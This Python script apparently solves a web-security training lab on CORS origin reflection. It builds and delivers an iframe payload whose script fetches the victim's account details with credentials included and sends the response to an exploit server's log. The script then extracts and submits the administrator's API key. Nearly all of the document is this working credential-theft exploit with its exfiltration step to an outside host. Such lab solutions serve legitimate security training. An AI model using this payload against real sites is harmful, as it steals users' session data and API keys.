################################################################
#
# Lab: CORS vulnerability with basic origin reflection
#
# Hack Steps: 
#      1. Deliver the exploit to the victim
#      2. Fetch the exploit server log page
#      3. Extract the administrator's API key from the logs
#      4. Submit the solution
#
################################################################
import requests
from colorama import Fore
import re

# Change this to your lab URL
LAB_URL = "https://0aac001103a1c7fa82fd7eee006400e4.web-security-academy.net"

# Change this to your lab URL
EXPLOIT_SERVER_URL = "https://exploit-0a5b00b703bbc78b82887d21019a00a7.exploit-server.net"

def main():
    print("â¦—1â¦˜ Delivering the exploit to the victim.. ", end="", flush=True)
    
    payload = f"""<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
                    fetch('{LAB_URL}/accountDetails', {{
                    method: 'GET',
                    credentials: 'include'
                    }})
                    .then(response => response.text())
                    .then(data => {{
                        fetch('{EXPLOIT_SERVER_URL}/log?key=' + data);
                    }});
                    </script>"></iframe>"""
    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    data = { "responseHead": response_head, "responseBody": payload, "formAction": "DELIVER_TO_VICTIM", "urlIsHttps": "on", "responseFile": "/exploit" }
    post_data(EXPLOIT_SERVER_URL, data)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—2â¦˜ Fetching your exploit server log page.. ", end="", flush=True)

    log_page = fetch(f"{EXPLOIT_SERVER_URL}/log")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—3â¦˜ Extracting the administrator's API key from the logs.. ", end="", flush=True)
    
    api_key = re.findall("apikey%22:%20%22(.*)%22,", log_page.text)[0]
    
    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + api_key)
    print(Fore.WHITE + "â¦—4â¦˜ Submitting the solution.. ", end="", flush=True) 

    data = { "answer": api_key }
    post_data(f"{LAB_URL}/submitSolution", data)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "ðŸ—¹ The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(url):
    try:  
        return requests.get(url)
    except:
        print(Fore.RED + "â¦—!â¦˜ Failed to fetch " + url + " through exception")
        exit(1)


def post_data(url, data):
    try:    
        return requests.post(url, data)
    except:
        print(Fore.RED + "â¦—!â¦˜ Failed to post data to " + url + " through exception")
        exit(1)


if __name__ == "__main__":
    main()

